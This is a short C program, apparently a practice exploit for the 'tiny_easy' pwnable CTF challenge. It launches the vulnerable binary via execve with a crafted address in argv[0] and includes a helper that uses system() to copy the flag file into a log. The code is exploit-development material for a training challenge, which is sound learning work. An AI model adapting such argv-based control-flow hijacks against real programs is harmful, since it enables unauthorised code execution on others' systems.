#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int read_flag_func() {
    printf("reach here\n");
    //system("cat /home/tiny_easy/flag > /tmp/pxx_tiny_easy/log.txt");
    system("cat /home/pxx/my_work/ctf/ctf-practice/write-ups/pwnable/Rookiss/tiny_easy/flag > /home/pxx/my_work/ctf/ctf-practice/write-ups/pwnable/Rookiss/tiny_easy/log.txt");
}
int main () {
    //08048554
    char *argv[2] = {"\x86\x06\x40\x00", "B"};
    char *envp[2] = {"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"};

    printf("0x%x\n", read_flag_func);
    
    execve("/home/pxx/my_work/ctf/ctf-practice/write-ups/pwnable/Rookiss/tiny_easy/tiny_easy", argv, envp);

    return 0;
}